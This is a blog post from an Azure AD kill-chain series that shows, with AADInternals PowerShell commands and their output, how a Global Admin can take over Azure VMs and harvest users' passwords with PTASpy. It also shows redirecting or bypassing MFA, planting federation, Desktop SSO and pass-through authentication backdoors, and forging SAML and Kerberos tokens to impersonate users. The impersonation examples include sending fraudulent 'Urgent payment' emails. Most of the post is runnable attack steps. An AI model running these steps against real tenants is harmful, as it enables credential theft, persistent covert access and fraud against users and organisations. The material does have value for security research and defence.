+++
title = "Keys of the kingdom: Playing God as Global Admin"
date = "2020-06-16"
lastmod = "2020-08-13"
categories =["blog"]
tags = ["Azure Active Directory","Azure","security","admin"]
thumbnail = "/images/posts/admin.png"
+++

This post is part 4/5 of <a href="/aadkillchain/" target="_blank">Azure AD and Microsoft 365 kill chain</a> blog series.

Global Admin role is the most powerfull administrator role in Azure AD. It is (almost) equivalent to the local system rigths in traditional Windows environment: **If you are a Global Admin, there is no security!**
As a Global Admin, there are no limits what you are allowed to do. For instance, one can easily access others' data. But why bother, if you can as easily impersonate users?

In this blog, using **AADInternals v0.4.0**, I'll show how (as an Global Administrator) to gather information of Azure subscriptions, gather users' credentials, get system level access to Azure VMs, and how to impersonate users. 

<!--more-->
# Reconnaissance

The <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#global-administrator--company-administrator" target="_blank">Global Admin role</a> gives access to 
all administrative features of Azure AD and Office/Microsoft 365 services.

## Azure subscriptions
As I described in my earlier blog <a href="/post/azurevms/#getting-access-to-azure" target="_blank">post</a>, Global Admins can get access to all Azure subscriptions by **elevating themselves** to **User Access Administrators**:
{{< highlight powershell >}}
# Get an access token and save it to the cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Grant Azure User Access Administrator role 
Grant-AADIntAzureUserAccessAdminRole
{{< /highlight>}}

Now you are able to list all Azure subscriptions of the tenant:
{{< highlight powershell >}}
# Update the access token after elevation and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Get all subscriptions of the current tenant
Get-AADIntAzureSubscriptions
{{< /highlight>}}

**Output:**
```
subscriptionId                       displayName   state  
--------------                       -----------   -----  
867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 MyAzure001    Enabled
99fccfb9-ed41-4179-aaf5-93cae2151a77 Pay-as-you-go Enabled
```


## Azure Virtual Machines

As I described in my earlier blog <a href="/post/azurevms/#getting-access-to-azure" target="_blank">post</a>, after elevating to **User Access Administrator** Global Admin can 
assign themselves <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles" target="_blank">Azure roles</a> (not Azure AD roles). 

For example, the easiest way to get access to virtual machines is to assign **Virtual Machine Contributor** role per Azure subscription:
{{< highlight powershell >}}
# Grant Virtual Machine Contributor role to the current user
Set-AADIntAzureRoleAssignment -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -RoleName "Virtual Machine Contributor"
{{< /highlight>}}

**Output:**
```
roleDefinitionId : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0/providers/Microsoft.Authorization/roleDefinitions/9980e02c-c2be-4d73-94e8-173b1dc7cf3c
principalId      : 90f9ca62-2238-455b-bb15-de695d689c12
principalType    : User
scope            : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
createdOn        : 2020-06-03T11:29:58.1683714Z
updatedOn        : 2020-06-03T11:29:58.1683714Z
createdBy        : 
updatedBy        : 90f9ca62-2238-455b-bb15-de695d689c12
```

Now we can list all virtual machines of the subscription:

{{< highlight powershell >}}
# Update the access token after role assignment and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List the VMs
Get-AADIntAzureVMs -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
{{< /highlight>}}

**Output:**
```
resourceGroup name     location   id                                   computerName adminUserName vmSize          OS     
------------- ----     --------   --                                   ------------ ------------- ------          --     
PRODUCTION    Client   westus     c210d38b-3346-41d3-a23d-27988315825b Client       AdminUSer     Standard_A2_v2  Windows
PRODUCTION    DC       westus     9b8f8753-196f-4f24-847a-e5bcb751936d DC           AdminUSer     Standard_DS1_v2 Windows
PRODUCTION    Exchange westus     a12ffb24-a69e-4ce9-aff3-275f49bba315 Exchange     AdminUSer     Standard_DS2_v2 Windows
PRODUCTION    Server1  westus     c7d98db7-ccb5-491f-aaeb-e71f0df478b6 Server1      AdminUSer     Standard_DS1_v2 Windows
TEST          Server2  eastus     ae34dfcc-ad89-4e53-b0b4-20d453bdfcef Server2      AdminUSer     Standard_DS1_v2 Windows
TEST          Server3  eastus     f8f6a7c5-9927-47f9-a790-84c866f5719c Server3      AzureUser     Standard_B1ms   Linux
```

# Compromise

## Azure Virtual Machines
As I described in my earlier blog <a href="/post/azurevms/#getting-access-to-azure" target="_blank">post</a>, **Virtual Machine Contributor** role
allows running scripts on any virtual machine of the Azure subscription as SYSTEM (Windows) or root (linux).

For example, we can run a simple "whoami" on the Server2 we found during the recon phase above:
{{< highlight powershell >}}
# Invoke "whoami" on Server2
Invoke-AADIntAzureVMScript -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -ResourceGroup TEST -Server Server2 -Script "whoami"
{{< /highlight>}}

**Output:**
```
[stdout]
nt authority\system

[stderr]
```

In practice, this gives full access to all virtual machines of the Azure subscription. 
Running a script is logged to activity log of the Azure subscription, but the content of the script is not.

## Pass-through authentication

As described in the last <a href="/post/on-prem_admin/#pass-through-authentication" target="_blank">blog post</a> of the kill chain series, on-prem administrators
can harvest users' credentials by using **PTASpy** (part of AADInternals).

Global Admins can install extra **Microsoft Azure AD Connect Authentication Agent**s for high-availability, as suggested by <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-quick-start#step-4-ensure-high-availability" target="_blank">Microsoft</a>.

The authentication agent is meant to be installed on a server which is a member to the same domain than Azure AD Connect. The installation does not check the domain of the computer it is installed, so **the authentication agent can be installed to any server**.
Together with PTASpy, this allows Global Admins to gather users' credentials using their own server.

When installing authentication agent, it is registered to Azure AD using the name of the server it is installed to. So, unless it is not named in the similar way than the other servers, this can be easily spotted from Azure AD.

With AADInternals, Global Admin can register an authentication agent using any name they want to:
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForPTA -SaveToCache

# Register new authentication agent
Register-AADIntPTAAgent -MachineName "server1.company.com" -FileName server1.pfx
{{< /highlight>}}

**Output:**
```
PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.pfx
```
The created certificate can now be used with the authentication agent.

## Multi-factor authentication

Global Admins can set users' <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-userstates#change-state-using-powershell">MFA settings</a> using MSOnline PowerShell module. 

With AADInternals, Global Admin can change the default MFA method of the user, but also their MFA phone number. 

The example below can be used to changes user's phone number to Global Admins number and the default method to SMS. This way, if Global Admin knows user's credentials, he or she can bypass also the MFA challenge.
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Set user MFA settings
Set-AADIntUserMFA -UserPrincipalName "user@company.com" -PhoneNumber "+1 123456789" -DefaultMethod OneWaySMS
{{< /highlight>}}

If an Azure authenticator is used instead, Global Admin can also modify those settings with AADInternals.

To show user's MFA app settings:
{{< highlight powershell >}}
# Get user's MFA app settings
Get-AADIntUserMFAApps -UserPrincipalName "user@company.com"
{{< /highlight>}}
Output:
```
AuthenticationType : Notification, OTP
DeviceName         : SM-R2D2
DeviceTag          : SoftwareTokenActivated
DeviceToken        : APA91...
Id                 : 454b8d53-d97e-4ead-a69c-724166394334
NotificationType   : GCM
OathTokenTimeDrift : 0
OathSecretKey      : 
PhoneAppVersion    : 6.2001.0140
TimeInterval       : 

AuthenticationType : OTP
DeviceName         : NO_DEVICE
DeviceTag          : SoftwareTokenActivated
DeviceToken        : NO_DEVICE_TOKEN
Id                 : aba89d77-0a69-43fa-9e5d-6f41c7b9bb16
NotificationType   : Invalid
OathTokenTimeDrift : 0
OathSecretKey      : 
PhoneAppVersion    : NO_PHONE_APP_VERSION
TimeInterval       :
```
From the output we can see that there are two "apps" registered.

The first one is the interactive Authenticator app on user's Android device (capable also for one-time-password (OTP)), and the second one is a pure OTP generator. 
OTP is generated based on a Base32 encoded secret (OathSecretKey) created when the authenticator was registered. 

If we know the **OathSecretKey**, we can generate valid OTP tokens. AFAIK, the only way to get this is to be present when the MFA device is registered when it is shown:
![Azure AD account](/images/posts/admin2.png)

With the secret key, we can now create OTP:
{{< highlight powershell >}}
# Generate OTP
New-AADIntOTP -SecretKey "jmbz yz2w lpxf nzjh"
{{< /highlight>}}
Output:
```
OTP     Valid
---     -----
990 653 15s 
```

Global Admin can also change the MFA device of the user. For instance, if the DeviceToken of the admin's Authenticator app is known, it can easily changed in place of user's app:
{{< highlight powershell >}}
# Change user's MFA device
Set-AADIntUserMFAApps -UserPrincipalName "user@company.com" -Id "454b8d53-d97e-4ead-a69c-724166394334" -DeviceToken "APA91bEvVMWXcLy7EUEge4jSkD7HAAdWPn-0WjOHrkg0zZvVpg0LRBLa9QN7mEXyJSslqbkWx1Q5Qz8aZyJ69gs0rNGn-b5tc71P-XwRQ734AsdrDCvgJ5F9x17K6kfdisbFrT4z6xQE9EUxgMg5ZA8A-TVXepyqGQ"
{{< /highlight>}}

Now the user's MFA challenges are directed to admin's device. However, as the user's details is not registered to admin's Authenticator, an error message is shown.

To circumvent this obstacle, I've created an open-source <a href="https://github.com/Gerenios/Authenticator" target="_blank">AADInternals Authenticator</a> which replaces Microsoft Authenticator. 
The Device Token of the authenticator can be easily copied and it will automatically accepts all authentication requests. Thus, Global Admin can bypass MFA.

**Note!** Both the phone number and Device Token can be restored, so make sure to save them before changing users' MFA settings.

# Persistence

## Azure Virtual Machines

As demonstrated <a href="#azure-virtual-machines-1">above</a> after giving themselves **Virtual Machine Contributor** role, Global Admins can run commands as SYSTEM or root.
As such, they can use any technique available for creating persistent access to virtual machines.

## Identity federation
As described in the last <a href="/post/on-prem_admin/#federation-services-ad-fs" target="_blank">blog post</a> of the kill chain series, on-prem administrators can export AD FS token signing certificate
and impersonate any user of the tenant (and bypass MFA).

While the Global Admin may or may not have access to on-prem servers, they can create a <a href="/post/aadbackdoor/" target="_blank">backdoor</a> directly to the Azure AD.

The basic idea is to convert a registered domain to federated using a certificate the admin has access to.

With AADInternals, this can be done using the built-in certificate. For example, if there is a domain named **company.myo365.site**, it can be converted to a backdoor:
{{< highlight powershell >}}
# Convert an existing domain to a backdoor
ConvertTo-AADIntBackdoor -DomainName "company.myo365.site"
{{< /highlight>}}

Output:
```
Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: YES

IssuerUri               Domain              
---------               ------              
http://any.sts/23748688 company.myo365.site
```
Now, as long as we know the ImmutableId of the user, we can create a SAML token and login as the user.
{{< highlight powershell >}}
# Create a new SAML token
$saml=New-AADIntSAMLToken -ImmutableID "UQ989+t6fEq9/0ogYtt1pA==" -Issuer "http://any.sts/23748688" -UseBuiltInCertificate
{{< /highlight>}}

With the SAML token, you can now get OAuth Access Token to be used with AADInternals functions.
{{< highlight powershell >}}
# Get an access token for Exchange Online
$at=Get-AADIntAccessTokenForEXO -SAMLToken $saml

# Send a message using "Outlook"
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
{{< /highlight>}}

## Desktop SSO (seamless single-sign-on)
As described in the last <a href="/post/on-prem_admin/#pass-through-authentication" target="_blank">blog post</a> of the kill chain series, on-prem administrators can extract
the password hash of the AZUREADSSOACC computer account and impersonate users with Kerberos tickets.

If the Desktop SSO is not used, Global Admin can enable it using any domain name and password, and use it as a <a href="/post/kerberos/" target="_blank">backdoor</a>:
{{< highlight powershell >}}
# Create an access token for PTA and save to cache
Get-AADIntAccessTokenForPTA -SaveToCache

# Enable the DesktopSSO
Set-AADIntDesktopSSOEnabled -Enable $true

# Enable the DesktopSSO for the given domain
Set-AADIntDesktopSSO -DomainName company.com -Password "mypassword" -Enable $true
{{< /highlight>}}

Now, as long as we know the SID of the user, we can create a Kerberos ticket, use it to get an access token for Exchange Online, and finally send an email using Outlook:

{{< highlight powershell >}}
# Create a Kerberos ticket
$kt=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Password "mypassword"

# Get an access token for Exchange Online
$et=Get-AADIntAccessTokenForEXO -KerberosTicket $kt -Domain company.com

# Send an email using Outlook API
Send-AADIntOutlookMessage -AccessToken $et -Recipient "accounting@company.com" -Subject "Invoice" -Message "Pay the attached invoice <b>ASAP!</b>"

{{< /highlight>}}

## Pass-through authentication

In my older blog <a href="/post/pta-deepdive/" target="_blank">post</a>, I explained how the PTA works under the hood.

With this information Global Admin can create a backdoor to Azure AD.

In the <a href="#pass-through-authentication" target="_blank">Compromise</a> section above, Global Admin was able to register an Authenticator app and create the certificate.

To create the backdoor using PTA:

* Install the authentication agent from <a href="https://download.msappproxy.net/Subscription/00000000-0000-0000-0000-000000000000/Connector/ptaDownloadConnectorInstaller" target="_blank">here</a> to a standalone server or virtual machine. 
* Configure the agent using your own tenant (you can get a trial tenant from <a href="https://signup.microsoft.com/Signup?OfferId=B07A1127-DE83-4a6d-9F85-2C104BDAE8B4&dl=ENTERPRISEPACK" target="_blank">here</a>)
* Change the certificate to one you created during the PTA agent registration
* Install PTASpy

To change the certificate:
{{< highlight powershell >}}
# Change the PTA certificate
Set-AADIntPTACertificate -PfxFileName server1.pfx
{{< /highlight>}}
The output should be similar to the following:
```
Certification information set, remember to restart the service.
```
**Note!** After a while, Azure AD won't send password requests encrypted using the certificate of the original agent (as it is inactive). That leads to "unable to encrypt" error message. 
If this happens, you need to find out (using SysInterals Procmon or similar tool) which certificate the agent tries to use under "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\", and give
read access to that file for "Network Service". Usually, it is the newest file.

To install PTASpy:
{{< highlight powershell >}}
# Install PTASpy
Install-AADIntPTASpy
{{< /highlight>}}
Output:
```
Are you sure you wan't to install PTASpy to this computer? Type YES to continue or CTRL+C to abort: yes
Installation successfully completed!
All passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv
```

Now you are able to gather users' credentials, but also to log in as any user. 
{{< highlight powershell >}}
# Show the PTASpy log with decoded passwords
Get-AADIntPTASpyLog -DecodePasswords
{{< /highlight>}}

**Output:**
```
UserName         Password   Time                
--------         --------   ----                
user@company.com MyPassword 5/22/2019 9:51:43 AM
user@company.com mYpASSWORD 5/22/2019 9:52:07 AM
```

**Note!** When there are multiple authentication agents installed, not all authentication requests end up to your instance.

# Actions on Intent

As demonstrated above, Global Admins can impersonate users with the three backdoors. As such, they can access users' information, send emails on their names, and much more.

# Summary
**If you are a Global Admin, there is no security!**

This means that Global Admins can do what ever they want to. However, all their actions are logged to audit logs. Therefore rogue admins often try to create a persistent
access to Azure AD using backdoors. After creating the backdoors, all impersonation actions are shown as legit logins. 

**Note!** Desktop SSO and PTA backdoors DO NOT bypass MFA! But, you can always change the MFA settings of the user..

# References
* <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles" target="_blank">Administrator role permissions in Azure Active Directory</a>
* <a href="https://docs.microsoft.com/en-us/office365/enterprise/subscriptions-licenses-accounts-and-tenants-for-microsoft-cloud-offerings" target="_blank">Subscriptions, licenses, accounts, and tenants for Microsoft's cloud offerings</a>